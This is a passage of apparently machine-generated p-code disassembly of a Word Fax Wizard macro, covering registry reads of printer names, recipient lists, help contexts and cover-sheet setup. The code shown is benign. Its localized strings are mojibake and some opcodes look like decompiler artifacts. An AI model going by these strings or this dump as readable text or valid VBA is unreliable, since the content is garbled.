\tQuoteRem 0x0028 0x0032 \"assistant help for ordinary doc. recipients' panel\"\n' Line #512:\n' Line #513:\n' \tQuoteRem 0x0000 0x003D \"tip displayed in an autodown balloon after the wizard is done\"\n' Line #514:\n' \tDim (Public) \n' \tVarDefn fCreatedCmdBar (As Boolean) 0x0020\n' \tQuoteRem 0x002B 0x002E \"tip is to be displayed only if cmd bar created\"\n' Line #515:\n' Line #516:\n' \tQuoteRem 0x0000 0x0050 \"arrays to get the MRU list of recipient names and numbers stored in the registry\"\n' Line #517:\n' \tDim \n' \tOptionBase \n' \tLd iMAX_RCPNTS \n' \tVarDefn rgstrMRUFaxNames (As String)\n' Line #518:\n' \tDim \n' \tOptionBase \n' \tLd iMAX_RCPNTS \n' \tVarDefn rgstrMRUFaxNums (As String) 0x0022\n' Line #519:\n' Line #520:\n' \tQuoteRem 0x0000 0x0044 \"arrays to get the recipients names and numbers that the user entered\"\n' Line #521:\n' \tDim \n' \tOptionBase \n' \tLd iMAX_RCPNTS \n' \tVarDefn rgstrRcpntFaxNames (As String)\n' Line #522:\n' \tDim \n' \tOptionBase \n' \tLd iMAX_RCPNTS \n' \tVarDefn rgstrRcpntFaxNums (As String) 0x0024\n' Line #523:\n' \tDim (Public) \n' \tVarDefn iNumRcpnts (As Integer)\n' Line #524:\n' Line #525:\n' \tQuoteRem 0x0000 0x001F \"DO NOT LOCALIZE - CONTROL NAMES\"\n' Line #526:\n' \tReparse 0x003A \"Public Const strCBO_RCPNT_NAME  As String = \"cboRcpntName\"\"\n' Line #527:\n' \tReparse 0x0039 \"Public Const strCBO_RCPNT_NUM   As String = \"cboRcpntNum\"\"\n' Line #528:\n' \tDim (Public) \n' \tVarDefn iCboRcpntNameFocus (As Integer) 0x0020\n' Line #529:\n' Line #530:\n' \tQuoteRem 0x0000 0x0022 \"DO NOT LOCALIZE - REGISTRY ENTRIES\"\n' Line #531:\n' \tReparse 0x0040 \"Public Const strRCPNT_NAME      As String = \"Name of recipient#\"\"\n' Line #532:\n' \tReparse 0x0042 \"Public Const strRCPNT_NUMBER    As String = \"Number of recipient#\"\"\n' Line #533:\n' \tReparse 0x0042 \"Public Const strNUM_RCPNTS      As String = \"Number of recipients\"\"\n' Line #534:\n' Line #535:\n' \tQuoteRem 0x0000 0x000A \"Help files\"\n' Line #536:\n' \tReparse 0x0037 \"Public Const strWIN_HELP_FILE As String = \"Windows.hlp\"\"\n' Line #537:\n' \tReparse 0x0035 \"Public Const strFAX_HELP_FILE As String = \"awfax.hlp\"\"\n' Line #538:\n' Line #539:\n' \tQuoteRem 0x0000 0x0015 \"contexts for the help\"\n' Line #540:\n' \tReparse 0x0033 \"Public Const lCNTXT_FAX_INSTALL As Long = 461903903\"\n' Line #541:\n' \tReparse 0x0031 \"Public Const lCNTXT_FAX_SEND As Long = 1698757633\"\n' Line #542:\n' \tReparse 0x003E \"Public Const HELP_COMMAND As Integer = 258 'hex value = 0x0102\"\n' Line #543:\n' Line #544:\n' \tQuoteRem 0x0000 0x0039 \"error number that word returns on fax not being installed\"\n' Line #545:\n' \tReparse 0x0035 \"Public Const iERR_FAX_NOT_INSTALLED As Integer = 5663\"\n' Line #546:\n' \tReparse 0x0030 \"Public Const iERR_FAX_NOT_SENT As Integer = 4559\"\n' Line #547:\n' Line #548:\n' \tQuoteRem 0x0000 0x0035 \"DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS\"\n' Line #549:\n' \tLineCont 0x0004 07 00 00 00\n' \tFuncDefn (Declare Function RegEnumKey Lib \"advapi32.dll\" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, ByVal cbName As Long) As Long)\n' Line #550:\n' Line #551:\n' \tLineCont 0x0004 07 00 00 00\n' \tFuncDefn (Declare Function RegOpenKey Lib \"advapi32.dll\" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long)\n' Line #552:\n' Line #553:\n' \tFuncDefn (Declare Function RegCloseKey Lib \"advapi32.dll\" (ByVal hKey As Long) As Long)\n' Line #554:\n' Line #555:\n' \tLineCont 0x0004 12 00 00 00\n' \tFuncDefn (Declare Function GetWindowsDirectory Lib \"kernel32\" (ByVal strDir As String, ByVal uSize As Integer) As Integer)\n' Line #556:\n' Line #557:\n' \tLineCont 0x0004 0D 00 00 00\n' \tFuncDefn (Declare Function FindWindow Lib \"USER32\" (ByVal strWndClassName As String, ByVal strWndName As String) As Long)\n' Line #558:\n' Line #559:\n' \tLineCont 0x0004 12 00 00 00\n' \tFuncDefn (Declare Function WinHelp Lib \"USER32\" (ByVal hwnd As Long, ByVal strFileName As String, ByVal wCmd As Integer, ByVal dwData As ) As Integer)\n' Line #560:\n' Line #561:\n' Line #562:\n' \tDim (Public) \n' \tVarDefn rgstrPrinterNames (As String) 0x001C\n' Line #563:\n' \tDim (Public) \n' \tVarDefn iTotalNumPrinters (As Integer) 0x001C\n' Line #564:\n' Line #565:\n' \tDim (Const) \n' \tLitHI4 0x0002 0x8000 \n' \tVarDefn HKEY_LOCAL_MACHINE (As Long)\n' Line #566:\n' \tQuoteRem 0x0000 0x0026 \"Const KEY_ALL_ACCESS As Long = &HF0063\"\n' Line #567:\n' \tDim (Const) \n' \tLitDI2 0x0000 \n' \tVarDefn ERROR_SUCCESS (As Long)\n' Line #568:\n' \tDim (Const) \n' \tLitDI2 0x0103 \n' \tVarDefn ERROR_NO_MORE_ITEMS (As Long)\n' Line #569:\n' Line #570:\n' \tQuoteRem 0x0000 0x0031 \"registry keys under which printer names are found\"\n' Line #571:\n' \tDim (Const) \n' \tLitStr 0x0031 \"System\\CurrentControlSet\\Control\\Print\\Providers\\\"\n' \tVarDefn strREG_PROVIDERS (As String)\n' Line #572:\n' \tDim (Const) \n' \tLitStr 0x0030 \"System\\CurrentControlSet\\Control\\Print\\Printers\\\"\n' \tVarDefn strREG_LOCAL_PRINTERS (As String)\n' Line #573:\n' Line #574:\n' \tQuoteRem 0x0000 0x0036 \"initialise the vars. whiehc refer to the wizard's name\"\n' Line #575:\n' \tFuncDefn (Public Sub InitWizardName(fDummy As Boolean))\n' Line #576:\n' Line #577:\n' \tLitStr 0x000C \"\u00a4\u00a4\u00a4\u00e5\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\"\n' \tSt strWizName \n' Line #578:\n' \tLitStr 0x000C \"\u00a4\u00a4\u00a4\u00e5\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\"\n' \tSt strWizLongName \n' Line #579:\n' \tLitStr 0x0005 \"CFax1\"\n' \tSt strWizShortName \n' Line #580:\n' Line #581:\n' \tEndSub \n' Line #582:\n' Line #583:\n' \tQuoteRem 0x0000 0x002A \"initialize strings specific to this wizard\"\n' Line #584:\n' \tFuncDefn (Private Sub InitWizardStrings())\n' Line #585:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #586:\n' Line #587:\n' \tQuoteRem 0x0004 0x0022 \"fax title for the different styles\"\n' Line #588:\n' \tLitStr 0x0008 \"\u00b6\u00c7\u00afu\u00abH\u00a5\u00f3\"\n' \tLd iSTY_CONTEMPORARY \n' \tArgsSt rgstrFaxTitle 0x0001 \n' Line #589:\n' \tLitStr 0x000C \"\u00b6\u00c7\u00afu\u00abH\u00a5\u00f3\u00aa\u00ed\u00b3\u00e6\"\n' \tLd iSTY_ELEGANT \n' \tArgsSt rgstrFaxTitle 0x0001 \n' Line #590:\n' \tLitStr 0x0004 \"\u00b6\u00c7\u00afu\"\n' \tLd iSTY_PROFESSIONAL \n' \tArgsSt rgstrFaxTitle 0x0001 \n' Line #591:\n' Line #592:\n' \tQuoteRem 0x0004 0x0028 \"text appearing after the unchecked boxes\"\n' Line #593:\n' \tLitStr 0x0004 \"\u00ab\u00e6\u00a5\u00f3\"\n' \tLitDI2 0x0001 \n' \tArgsSt rgstrChkBoxText 0x0001 \n' Line #594:\n' \tLitStr 0x0006 \"\u00bd\u00d0\u00acd\u00be\\\"\n' \tLitDI2 0x0002 \n' \tArgsSt rgstrChkBoxText 0x0001 \n' Line #595:\n' \tLitStr 0x0006 \"\u00bd\u00d0\u00a7\u00e5\u00a5\u00dc\"\n' \tLitDI2 0x0003 \n' \tArgsSt rgstrChkBoxText 0x0001 \n' Line #596:\n' \tLitStr 0x0006 \"\u00bd\u00d0\u00a6^\u00c2\u00d0\"\n' \tLitDI2 0x0004 \n' \tArgsSt rgstrChkBoxText 0x0001 \n' Line #597:\n' \tLitStr 0x0006 \"\u00bd\u00d0\u00b6\u00c7\u00be\\\"\n' \tLitDI2 0x0005 \n' \tArgsSt rgstrChkBoxText 0x0001 \n' Line #598:\n' Line #599:\n' \tQuoteRem 0x0004 0x0012 \"Assistant messages\"\n' Line #600:\n' \tLitStr 0x0061 \"\u00a8\u00cf\u00a5\u00ce\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00b1z\u00a5i\u00a5H\u00b6\u00c7\u00afu\u00b9q\u00a4l\u00b6l\u00a5\u00f3\u00a1A\u00b1N\u00abH\u00a5\u00f3\u00a6X\u00a8\u00d6\u00a8\u00ec\u00b6\u00c7\u00afu\u00a4\u00e5\u00a5\u00f3\u00a4\u00a4\u00a4@\u00b0_\u00b6\u00c7\u00afu\u00a1A \u00a9\u00ce\u00b1q\u00b6\u00c7\u00afu\u00be\u00f7\u00a4\u00a4\u00a6L\u00a5X\u00a4@\u00b1i\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a1C\"\n' \tLitDI2 0x0000 \n' \tArgsSt rgstrAssistantMsg 0x0001 \n' Line #601:\n' \tLitStr 0x0046 \"\u00a6p\u00aaG\u00b1z\u00b7Q\u00adn\u00b6\u00c7\u00afu\u00a8\u00e4\u00a5\u00a6\u00a4\u00e5\u00a5\u00f3\u00a1A\u00bd\u00d0\u00a5\u00fd\u00b6}\u00b1\u00d2\u00b1z\u00b7Q\u00adn\u00b6\u00c7\u00afu\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1A\u00b5M\u00ab\u00e1\u00a6A\u00b0\u00f5\u00a6\u00e6\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1C\"\n' \tLitDI2 0x0001 \n' \tArgsSt rgstrAssistantMsg 0x0001 \n' Line #602:\n' \tLitStr 0x00D6 \"\u00a6p\u00aaG\u00b1z\u00aa\u00ba\u00a7@\u00b7~\u00a8t\u00b2\u00ce\u00acO Windows NT\u00a1A\u00abh\u00b1z\u00b5L\u00aak\u00a8\u00cf\u00a5\u00ce Microsoft \u00b6\u00c7\u00afu\u00a1A\u00a6\u00fd\u00acO\u00b1z\u00c1\u00d9\u00acO\u00a5i\u00a5H\u00a8\u00cf\u00a5\u00ce\u00a8\u00e4\u00a5\u00a6\u00a4w\u00a6w\u00b8\u00cb\u00a6b\u00a8t\u00b2\u00ce\u00a4\u00a4\u00aa\u00ba\u00b6\u00c7\u00afu\u00b3n\u00c5\u00e9\u00a8\u00d3\u00ac\u00b0\u00b1z\u00b6\u00c7\u00afu\u00a1C\u00a6p\u00aaG\u00b1z\u00aa\u00ba\u00a8t\u00b2\u00ce\u00a4\u00a3\u00a4\u00e4\u00b4\u00a9\u00b6\u00c7\u00afu\u00a5\\\u00af\u00e0\u00aa\u00ba\u00b8\u00dc\u00a1A\u00a8S\u00c3\u00f6\u00abY\u00a1A\u00b1z\u00a5i\u00a5H\u00a5\u00fd\u00b1N\u00a4\u00e5\u00a5\u00f3\u00a6C\u00a6L\u00a5X\u00a8\u00d3\u00a1A\u00b5M\u00ab\u00e1\u00a6A\u00a7Q\u00a5\u00ce\u00b6\u00c7\u00afu\u00be\u00f7\u00b1N\u00a4\u00e5\u00a5\u00f3\u00b6\u00c7\u00afu\u00a5X\u00a5h\u00a1C\"\n' \tLitDI2 0x0002 \n' \tArgsSt rgstrAssistantMsg 0x0001 \n' Line #603:\n' \tLitStr 0x008D \"\u00a6p\u00aaG\u00b1z\u00b4\u00bf\u00a5\u00ce\u00b9L\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00abh\u00a4U\u00a9\u00d4\u00a6\u00a1\u00b2M\u00b3\u00e6\u00a4\u00e8\u00b6\u00f4\u00a4\u00a4\u00b7|\u00a6C\u00a5X\u00b1z\u00b3\u00cc\u00aa\u00f1\u00b6\u00c7\u00afu\u00b9L\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a6W\u00ba\u00d9\u00a1C \u00b1z\u00a5i\u00a5H\u00a6b\u00b2M\u00b3\u00e6\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa\u00b6\u00c7\u00afu\u00b9L\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1A\u00b1N\u00a8\u00e4\u00aa\u00fe\u00a6b\u00b1z\u00aa\u00ba\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4\u00a7\u00ab\u00e1\u00a4@\u00b0_\u00b6\u00c7\u00afu\u00a5X\u00a5h\u00a1C\"\n' \tLd iPANEL_RCPNTS \n' \tArgsSt rgstrAssistantMsg 0x0001 \n' Line #604:\n' \tLitStr 0x002A \"\u00bd\u00d0\u00bf\u00e9\u00a4J\u00b1z\u00b7Q\u00bcg\u00a6b\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4W\u00a6\u00b3\u00c3\u00f6\u00b0e\u00a5\u00f3\u00aa\u00cc\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1C\"\n' \tLd iPANEL_SENDER \n' \tArgsSt rgstrAssistantMsg 0x0001 \n' Line #605:\n' \tLitStr 0x005A \"\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00b1z\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a9\u00d2\u00adn\u00aa\u00ba\u00ae\u00e6\u00a6\u00a1\u00a1C\u00a6b\u00b6\u00c7\u00afu\u00a4\u00a7\u00abe\u00a1A\u00b1z\u00c1\u00d9\u00acO\u00a5i\u00a5H\u00a7\u00ef\u00c5\u00dc\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00aa\u00ba\u00a5~\u00c6[\u00a1A\u00a9\u00ce\u00acO\u00a5[\u00a4J\u00a5\u00b2\u00adn\u00aa\u00ba\u00b5\u00f9\u00b0O\u00a1C\"\n' \tLd iPANEL_STYLE \n' \tArgsSt rgstrAssistantMsg 0x0001 \n' Line #606:\n' \tLitStr 0x0020 \"\u00adn\u00ad\u00d7\u00a7\u00ef\u00a5\u00f4\u00a6\u00f3\u00b3]\u00a9w\u00a1A\u00bd\u00d0\u00ab\u00f6\u00a1u\u00a4W\u00a4@\u00a8B\u00a1v\u00a1C\"\n' \tLd iMAX_PANEL \n' \tArgsSt rgstrAssistantMsg 0x0001 \n' Line #607:\n' \tQuoteRem 0x0004 0x007E \"if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too.\"\n' Line #608:\n' \tLitStr 0x008E \"\u00bd\u00d0\u00c2I\u00a8\u00fa\u00a1u\u00a9m\u00a6W\u00a1v\u00c4\u00e6\u00a6\u00ec\u00a1A\u00a6A\u00a8\u00d3\u00bd\u00d0\u00c2I\u00a8\u00fa\u00a1u\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1v\u00c4\u00e6\u00a6\u00ec\u00a1A \u00b5M\u00ab\u00e1\u00b1q\u00b3q\u00b0T\u00bf\u00fd\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa\u00adn\u00a5[\u00a4J\u00aa\u00ba\u00a6\u00ac\u00a5\u00f3\u00a4H\u00a9\u00ce\u00a8\u00e4\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1C \u00b1z\u00a5i\u00a5H\u00bf\u00ef\u00be\u00dc\u00b6\u00c7\u00afu\u00b5\u00b9\u00a8C\u00a4@\u00ad\u00d3\u00a4H\u00a9\u00ce\u00acO\u00ab\u00fc\u00a9w\u00a5u\u00b6\u00c7\u00afu\u00b5\u00b9\u00acY\u00a4H\u00a1C\"\n' \tSt strAsstMsgRcpntsFormLtr \n' Line #609:\n' \tLitStr 0x0078 \"\u00a6p\u00aaG\u00b1z\u00b4\u00bf\u00a5\u00ce\u00b9L\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00a8\u00ba\u00bb\u00f2\u00a1u\u00a9m\u00a6W\u00a1v\u00c4\u00e6\u00a6\u00ec\u00aa\u00ba\u00a4U\u00a9\u00d4\u00a6\u00a1\u00b2M\u00b3\u00e6\u00a4\u00e8\u00b6\u00f4\u00a4\u00a4\u00b7|\u00a6\u00b3\u00b3\u00cc\u00aa\u00f1\u00b6\u00c7\u00afu\u00b9\u00ef\u00b6H\u00aa\u00ba\u00a6W\u00a6r\u00a1C\u00b1z\u00a5i\u00a5H\u00b1q\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a9m\u00a6W\u00b4\u00a1\u00a4J\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4\u00a4\u00a1C\"\n' \tSt strAsstMsgRcpntsOrdDoc \n' Line #610:\n' Line #611:\n' Line #612:\n' \tLitStr 0x000E \"\u00b1M\u00b7~\u00a6\u00a1\u00b6\u00c7\u00afu.dot\"\n' \tLd iSTY_PROFESSIONAL \n' \tLd iLONG_NAME \n' \tArgsSt rgstrTemplateFileNames 0x0002 \n' Line #613:\n' \tLitStr 0x000A \"cPrfax.dot\"\n' \tLd iSTY_PROFESSIONAL \n' \tLd iSHORT_NAME \n' \tArgsSt rgstrTemplateFileNames 0x0002 \n' Line #614:\n' \tLitStr 0x000E \"\u00b2{\u00a5N\u00a6\u00a1\u00b6\u00c7\u00afu.dot\"\n' \tLd iSTY_CONTEMPORARY \n' \tLd iLONG_NAME \n' \tArgsSt rgstrTemplateFileNames 0x0002 \n' Line #615:\n' \tLitStr 0x000A \"cCofax.dot\"\n' \tLd iSTY_CONTEMPORARY \n' \tLd iSHORT_NAME \n' \tArgsSt rgstrTemplateFileNames 0x0002 \n' Line #616:\n' \tLitStr 0x000E \"\u00a8\u00e5\u00b6\u00ae\u00a6\u00a1\u00b6\u00c7\u00afu.dot\"\n' \tLd iSTY_ELEGANT \n' \tLd iLONG_NAME \n' \tArgsSt rgstrTemplateFileNames 0x0002 \n' Line #617:\n' \tLitStr 0x000A \"cElfax.dot\"\n' \tLd iSTY_ELEGANT \n' \tLd iSHORT_NAME \n' \tArgsSt rgstrTemplateFileNames 0x0002 \n' Line #618:\n' Line #619:\n' \tLitStr 0x0006 \"\u00b5\u00f9\u00b8\u00d1\u00a1G\"\n' \tLd iSTY_PROFESSIONAL \n' \tArgsSt rgstrNotes 0x0001 \n' Line #620:\n' \tLitStr 0x0006 \"\u00b5\u00f9\u00b8\u00d1\u00a1G\"\n' \tLd iSTY_CONTEMPORARY \n' \tArgsSt rgstrNotes 0x0001 \n' Line #621:\n' \tLitStr 0x0006 \"\u00b5\u00f9\u00b8\u00d1\u00a1G\"\n' \tLd iSTY_ELEGANT \n' \tArgsSt rgstrNotes 0x0001 \n' Line #622:\n' Line #623:\n' \tQuoteRem 0x0004 0x0047 \"'**********************************************************************\"\n' Line #624:\n' \tQuoteRem 0x0004 0x0022 \"DO NOT LOCALIZE BEYOND THIS POINT.\"\n' Line #625:\n' \tQuoteRem 0x0004 0x004F \"'******************************************************************************\"\n' Line #626:\n' Line #627:\n' \tQuoteRem 0x0004 0x0044 \"initialize arrays with the color of the subway shapes for the panels\"\n' Line #628:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLd iMAX_PANEL \n' \tFor \n' Line #629:\n' \tLitVarSpecial (False)\n' \tLd i \n' \tArgsSt rgfSkipPanel 0x0001 \n' Line #630:\n' \tLd COLOR_LIGHTGREY \n' \tLd i \n' \tArgsSt rgiColorShape 0x0001 \n' Line #631:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #632:\n' Line #633:\n' \tLitStr 0x0002 \"\u2022\"\"\n' \tSt strBULLET \n' Line #634:\n' \tLitDI2 0x000B \n' \tArgsLd Chr$ 0x0001 \n' \tSt strSOFT_ENTER \n' Line #635:\n' \tLitDI2 0x0022 \n' \tArgsLd Chr$ 0x0001 \n' \tSt strQUOTE \n' Line #636:\n' Line #637:\n' \tQuoteRem 0x0004 0x003E \"DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET\"\n' Line #638:\n' \tQuoteRem 0x0004 0x0021 \"OF DIALOG VALUES IN THE REGISTRY.\"\n' Line #639:\n' \tLd strREG_SETTINGS_BASE_KEY \n' \tLitStr 0x000A \"Fax Wizard\"\n' \tConcat \n' \tSt strRegSettingsKey \n' Line #640:\n' \tEndSub \n' Line #641:\n' Line #642:\n' \tQuoteRem 0x0000 0x0014 \"initialises the form\"\n' Line #643:\n' \tFuncDefn (Private Sub InitForm())\n' Line #644:\n' \tOnError FatalError \n' Line #645:\n' Line #646:\n' \tSetStmt \n' \tNew id_FFFF\n' \tSet formWizard \n' Line #647:\n' \tLd formWizard \n' \tLitNothing \n' \tIs \n' \tIfBlock \n' Line #648:\n' \tLd strERR_INIT_FORM \n' \tArgsCall DisplayErrorMsg 0x0001 \n' Line #649:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #650:\n' \tEndIfBlock \n' Line #651:\n' Line #652:\n' \tLitDI2 0x0000 \n' \tSt iCurrentPanel \n' Line #653:\n' \tLitStr 0x0001 \" \"\n' \tLd strWizLongName \n' \tConcat \n' \tLitStr 0x0001 \" \"\n' \tConcat \n' \tLd formWizard \n' \tMemLd lblWizardName1 \n' \tMemSt Caption \n' Line #654:\n' \tExitSub \n' Line #655:\n' Line #656:\n' \tLabel FatalError \n' Line #657:\n' \tLd strERR_INIT_FORM \n' \tArgsCall DisplayErrorMsg 0x0001 \n' Line #658:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #659:\n' Line #660:\n' \tEndSub \n' Line #661:\n' Line #662:\n' \tFuncDefn (Sub InitWizard(fDummy As Boolean))\n' Line #663:\n' Line #664:\n' \tArgsCall InitForm 0x0000 \n' Line #665:\n' \tArgsCall InitWizardStrings 0x0000 \n' Line #666:\n' Line #667:\n' \tLitVarSpecial (False)\n' \tSt fNoCovSht \n' Line #668:\n' \tLitVarSpecial (False)\n' \tSt fStylesCopied \n' Line #669:\n' \tEndSub \n' Line #670:\n' Line #671:\n' \tFuncDefn (Public Sub SetMainDoc(fDummy As Boolean))\n' Line #672:\n' \tDim \n' \tVarDefn cDocs (As Integer)\n' Line #673:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #674:\n' Line #675:\n' \tOnError FatalError \n' Line #676:\n' Line #677:\n' \tLitVarSpecial (False)\n' \tSt fDocIsFormLtr \n' Line #678:\n' \tLitVarSpecial (False)\n' \tSt fDocPresent \n' Line #679:\n' \tLitVarSpecial (False)\n' \tSt fDocChanged \n' Line #680:\n' \tLd Application \n' \tMemLd Documents \n' \tMemLd Count \n' \tSt cDocs \n' Line #681:\n' Line #682:\n' \tLd cDocs \n' \tLitDI2 0x0001 \n' \tGt \n' \tIfBlock \n' Line #683:\n' \tQuoteRem 0x0004 0x0041 \"we don't want to add the doc. that was just created thro' FileNew\"\n' Line #684:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLd cDocs \n' \tFor \n' Line #685:\n' \tLd i \n' \tArgsLd Documents 0x0001 \n' \tMemLd New \n' \tLd formWizard \n' \tMemLd cboDocList \n' \tArgsMemCall AddItem 0x0001 \n' Line #686:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #687:\n' Line #688:\n' \tLitDI2 0x0000 \n' \tLd formWizard \n' \tMemLd cboDocList \n' \tMemSt ListIndex \n' Line #689:\n' \tLitVarSpecial (True)\n' \tSt fDocPresent \n' Line #690:\n' \tElseBlock \n' Line #691:\n' \tQuoteRem 0x0008 0x0029 \"just one doc. i.e the freshly created one\"\n' Line #692:\n' \tSetStmt \n' \tLitNothing \n' \tSet objMainDoc \n' Line #693:\n' \tEndIfBlock \n' Line #694:\n' \tExitSub \n' Line #695:\n' Line #696:\n' \tLabel FatalError \n' Line #697:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #698:\n' Line #699:\n' \tEndSub \n' Line #700:\n' Line #701:\n' \tQuoteRem 0x0000 0x0032 \"checks the kind of document and sets fDocIsFormLtr\"\n' Line #702:\n' \tFuncDefn (Public Sub CheckDocKind(objDoc As ))\n' Line #703:\n' \tDim \n' \tVarDefn objMM (As MailMerge)\n' Line #704:\n' \tDim \n' \tVarDefn strQueryString (As String)\n' Line #705:\n' \tOnError LReturn \n' Line #706:\n' \tLitVarSpecial (False)\n' \tSt fDocIsFormLtr \n' Line #707:\n' \tSetStmt \n' \tLd objMainDoc \n' \tMemLd MailMerge \n' \tSet objMM \n' Line #708:\n' \tSetStmt \n' \tLd objMM \n' \tMemLd DataSource \n' \tSet objDataSrc \n' Line #709:\n' \tLd objDataSrc \n' \tMemLd TypeOf \n' \tLd wdNoMergeInfo \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo LReturn \n' \tEndIf \n' Line #710:\n' \tLd objDataSrc \n' \tMemLd QueryString \n' \tSt strQueryString \n' Line #711:\n' \tLd strQueryString \n' \tLitDI2 0x00FF \n' \tArgsLd LBound$ 0x0002 \n' \tSt strFormLetterSQL \n' Line #712:\n' \tLd strQueryString \n' \tLitDI2 0x0100 \n' \tArgsLd Mid$$ 0x0002 \n' \tSt strFormLetterSQL1 \n' Line #713:\n' \tLd objDataSrc \n' \tMemLd ConnectString \n' \tSt strConnectString \n' Line #714:\n' \tLitVarSpecial (True)\n' \tSt fDocIsFormLtr \n' Line #715:\n' Line #716:\n' \tExitSub \n' Line #717:\n' \tLabel LReturn \n' Line #718:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #719:\n' \tLitVarSpecial (False)\n' \tSt fDocIsFormLtr \n' Line #720:\n' \tEndSub \n' Line #721:\n' Line #722:\n' \tFuncDefn (Public Sub CreateCoverSheet(fDummy As Boolean))\n' Line #723:\n' \tDim \n' \tVarDefn strDocName (As String)\n' Line #724:\n' \tDim \n' \tVarDefn objFps (As PageSetup)\n' Line #725:\n' Line #726:\n' \tOnError FatalError \n' Line #727:\n' \tLd strCREATING_DOC \n' \tLd Application \n' \tMemSt StatusBar \n' Line #728:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #729:\n' Line #730:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #731:\n' Line #732:\n' \tLd fChangeToA4 \n' \tIfBlock \n' Line #733:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd PageSetup \n' \tSet objFps \n' Line #734:\n' \tLd sA4_LEFT_MARGIN \n' \tLd objFps \n' \tMemSt LeftMargin \n' Line #735:\n' \tLd sA4_RIGHT_MARGIN \n' \tLd objFps \n' \tMemSt RightMargin \n' Line #736:\n' \tLd fChangeToLetter \n' \tElseIfBlock \n' Line #737:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd PageSetup \n' \tSet objFps \n' Line #738:\n' \tLd sLETTER_MARGIN \n' \tLd objFps \n' \tMemSt LeftMargin \n' Line #739:\n' \tLd sLETTER_MARGIN \n' \tLd objFps \n' \tMemSt RightMargin \n' Line #740:\n' \tEndIfBlock \n' Line #741:\n' Line #742:\n' \tLineCont 0x0004 14 00 08 00\n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tParen \n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tAnd \n' \tParen \n' \tLd fDocIsFormLtr \n' \tOr \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tArgsCall CreateDataSource 0x0000 \n' \tEndIf \n' Line #743:\n' Line #744:\n' \tLd strCREATING_DOC \n' \tSt StatusBar \n' Line #745:\n' \tLd iFaxStyle \n' \tSelectCase \n' Line #746:\n' \tLd iSTY_PROFESSIONAL \n' \tCase \n' \tCaseDone \n' Line #747:\n' \tArgsCall CreateProfContCoverSheet 0x0000 \n' Line #748:\n' \tLd iSTY_CONTEMPORARY \n' \tCase \n' \tCaseDone \n' Line #749:\n' \tArgsCall CreateProfContCoverSheet 0x0000 \n' Line #750:\n' \tLd iSTY_ELEGANT \n' \tCase \n' \tCaseDone \n' Line #751:\n' \tArgsCall CreateElegCoverSheet 0x0000 \n' Line #752:\n' \tEndSelect \n' Line #753:\n' Line #754:\n' \tLd fDocPresent \n' \tParen \n' \tLd formWizard \n' \tMemLd optCovSht \n' \tMemLd Value \n' \tParen \n' \tNot \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #755:\n' \tLd ActiveWindow \n' \tMemLd Caption \n' \tLitStr 0x0003 \" - \"\n' \tConcat \n' \tLd objMainDoc \n' \tMemLd New \n' \tConcat \n' \tLd strWINDOW_CAPTION \n' \tConcat \n' \tSt strDocName \n' Line #756:\n' \tElseBlock \n' Line #757:\n' \tLd ActiveWindow \n' \tMemLd Caption \n' \tLd strCOVER_SHEET_CAPTION \n' \tConcat \n' \tSt strDocName \n' Line #758:\n' \tEndIfBlock \n' Line #759:\n' Line #760:\n' \tStartWithExpr \n' \tLd ActiveWindow \n' \tWith \n' Line #761:\n' \tLd strDocName \n' \tMemStWith Caption \n' Line #762:\n' Line #763:\n' \tLitVarSpecial (False)\n' \tMemLdWith View \n' \tMemSt TableGridlines \n' 